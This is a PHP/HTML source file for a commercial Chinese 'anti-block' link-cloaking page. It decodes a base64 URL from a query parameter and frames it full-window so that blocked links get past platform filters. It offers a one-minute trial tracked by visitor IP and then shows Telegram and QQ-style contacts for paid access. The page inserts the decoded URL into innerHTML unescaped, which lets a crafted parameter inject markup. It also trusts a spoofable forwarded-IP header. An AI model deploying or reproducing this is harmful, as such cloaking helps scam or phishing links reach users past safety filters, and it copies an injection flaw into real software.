<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/include/dbconfig.php');
header('Location:'. htmlspecialchars_decode('../jy').'');

?><?php
// 配置参数
$expireMinutes = 1; // 3分钟有效期
$ipStorageFile = 'ip_access.json'; // 存储IP访问记录的文件

// 确保存储文件存在
if (!file_exists($ipStorageFile)) {
    file_put_contents($ipStorageFile, json_encode(array()));
    chmod($ipStorageFile, 0666);
}

// 获取用户真实IP
function getClientIp() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    return $ip;
}

$userIp = getClientIp();
$currentTime = time();
$accessData = json_decode(file_get_contents($ipStorageFile), true);
$isExpired = false;
$remainingTime = 0;

// 检查IP访问记录
if (isset($accessData[$userIp])) {
    $expireTime = $accessData[$userIp]['expire_time'];
    if ($currentTime > $expireTime) {
        $isExpired = true;
    } else {
        $remainingTime = $expireTime - $currentTime;
    }
} else {
    $accessData[$userIp] = array(
        'start_time' => $currentTime,
        'expire_time' => $currentTime + ($expireMinutes * 60)
    );
    $fp = fopen($ipStorageFile, 'w');
    flock($fp, LOCK_EX);
    fwrite($fp, json_encode($accessData));
    flock($fp, LOCK_UN);
    fclose($fp);
    
    $remainingTime = $expireMinutes * 60;
}
?>
<html lang="zh-CN">
<head>
  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
  <meta content="yes" name="apple-mobile-web-app-capable">
  <meta content="yes" name="apple-touch-fullscreen">
  <meta content="black" name="apple-mobile-web-app-status-bar-style">
  <meta content="320" name="MobileOptimized">
  <title></title>
<style>
   /* 基础样式重置 */
   * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
   }
   
   body, html {
       width: 100%;
       height: 100%;
       overflow: hidden; /* 隐藏页面自身滚动条，由iframe控制 */
   }
   
   /* 三点加载动画样式 */
   .container {
       width: 100px;
       height: 100px;
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
       z-index: 9997; /* 确保在iframe上方显示 */
   }

   .dot {
       width: 15px;
       height: 15px;
       border-radius: 50%;
       background-color: #000;
       position: absolute;
       top: 0;
       bottom: 0;
       left: 0;
       right: 0;
       margin: auto;
   }

   .dot-3 {
       background-color: #f74d75;
   }

   .dot-2 {
       background-color: #10beae;
   }

   .dot-1 {
       background-color: #ffe386;
   }

   .dot-3 {
       background-color: #f74d75;
       animation: dot-3-move 2s ease infinite;
   }

   @keyframes dot-3-move {
       20% { transform: scale(1) }
       45% { transform: translateY(-18px) scale(.45) }
       60% { transform: translateY(-25px) scale(.45) }
       80% { transform: translateY(-25px) scale(.45) }
       100% { transform: translateY(0px) scale(1) }
   }

   .dot-2 {
       background-color: #10beae;
       animation: dot-2-move 2s ease infinite;
   }

   .dot-1 {
       background-color: #ffe386;
       animation: dot-1-move 2s ease infinite;
   }

   @keyframes dot-2-move {
       20% { transform: scale(1) }
       45% { transform: translate(-16px, 12px) scale(.45) }
       60% { transform: translate(-20px, 15px) scale(.45) }
       80% { transform: translate(-20px, 15px) scale(.45) }
       100% { transform: translateY(0px) scale(1) }
   }

   @keyframes dot-1-move {
       20% { transform: scale(1) }
       45% { transform: translate(16px, 12px) scale(.45) }
       60% { transform: translate(20px, 15px) scale(.45) }
       80% { transform: translate(20px, 15px) scale(.45) }
       100% { transform: translateY(0px) scale(1) }
   }

   .container {
       animation: rotate-move 2s ease-in-out infinite;
   }

   @keyframes rotate-move {
       55% { transform: translate(-50%, -50%) rotate(0deg) }
       80% { transform: translate(-50%, -50%) rotate(360deg) }
       100% { transform: translate(-50%, -50%) rotate(360deg) }
   }
   
   /* 嵌入网站样式 - 直接占满整个页面 */
   .embedded-website {
       width: 100%;
       height: 100%;
       border: none; /* 移除iframe边框 */
       display: block; /* 确保无额外间距 */
   }
   
   /* 到期提示样式 */
   .expired-message {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
       background-color: white;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       padding: 20px;
       box-sizing: border-box;
       z-index: 9999;
       font-family: Arial, sans-serif;
       text-align: center;
   }
   
   .expired-message h2 {
       color: #f74d75;
       margin-bottom: 20px;
   }
   
   .expired-message p {
       font-size: 16px;
       line-height: 1.6;
       margin-bottom: 10px;
   }
</style>
</head>

<body>
<?php if ($isExpired): ?>
    <!-- 过期时显示提示信息 -->
    <div class="expired-message">
        <h2>防红体验已到期</h2>
        <p>如需继续使用，请通过以下方式联系我们进行付费开通</p>
        <p>Telegram 联系@haodai777</p>
        <p>海鸥联系610626347</p>
    </div>
<?php else: ?>
    <!-- 保留三点加载动画 -->
    <div class="container">
        <div class="dot dot-1"></div>
        <div class="dot dot-2"></div>
        <div class="dot dot-3"></div>
    </div>

    <!-- 动态加载被嵌入网站的iframe -->
    <div id="website-container"></div>

    <script type="text/javascript" src="https://js.users.51.la/21974493.js"></script>

    <script>
    // 从PHP获取剩余时间（秒）
    var remainingTime = <?php echo $remainingTime; ?>;
    
    // 倒计时逻辑（后台运行，不显示）
    function startBackgroundCountdown() {
        const checkExpiration = () => {
            if (remainingTime <= 0) {
                clearInterval(timer);
                // 倒计时结束后刷新页面，显示过期信息
                window.location.reload();
                return;
            }
            remainingTime -= 1;
        };
        
        // 每秒检查一次
        const timer = setInterval(checkExpiration, 1000);
    }

    // 加载并显示被嵌入的网站
    function loadEmbeddedWebsite() {
        var urlParams = new URLSearchParams(window.location.search);
        var encodedParam = urlParams.get('c');
        
        if (encodedParam) {
            try {
                var tureurl = atob(encodedParam);
                if (tureurl && tureurl.includes("http")) {
                    // 创建iframe并插入页面，占满整个窗口
                    const container = document.getElementById('website-container');
                    container.innerHTML = `<iframe class="embedded-website" onload="bindMouseWhee(this)" src="${tureurl}"></iframe>`;
                    
                    // iframe加载完成后隐藏加载动画
                    const loadingAnimation = document.querySelector(".container");
                    setTimeout(() => {
                        loadingAnimation.style.display = "none";
                    }, 1500); // 1.5秒后隐藏动画（可根据需要调整）
                } else {
                    console.log("无效的URL地址");
                }
            } catch (e) {
                console.log("URL解析失败:", e);
            }
        } else {
            console.log("未找到URL参数");
        }
    }

    // 跨域兼容的鼠标滚轮处理
    var firefox = navigator.userAgent.indexOf('Firefox') != -1;
    function bindMouseWhee(ifr) {
        try {
            var doc = ifr.contentWindow.document;
            if (doc.domain === document.domain) {
                function MouseWheel(e, doc) {
                    e.preventDefault && e.preventDefault();
                    e.returnValue = false;
                    var up = firefox && e.detail < 0 || e.wheelDelta > 0;
                    doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
                }
                
                if (firefox) {
                    doc.addEventListener('DOMMouseScroll', function(e) {
                        MouseWheel(e, doc);
                    }, false);
                } else {
                    doc.onmousewheel = function(e) {
                        MouseWheel(e || ifr.contentWindow.event, doc);
                    };
                }
            }
        } catch(e) {
            // 跨域时不做特殊处理，使用默认滚动行为
            console.log('跨域iframe，使用默认滚动');
        }
    }

    // 页面加载完成后初始化
    window.onload = function() {
        startBackgroundCountdown(); // 启动后台倒计时（不显示）
        loadEmbeddedWebsite(); // 加载显示被嵌入的网站
    };
</script>
<?php endif; ?>
</body>
</html>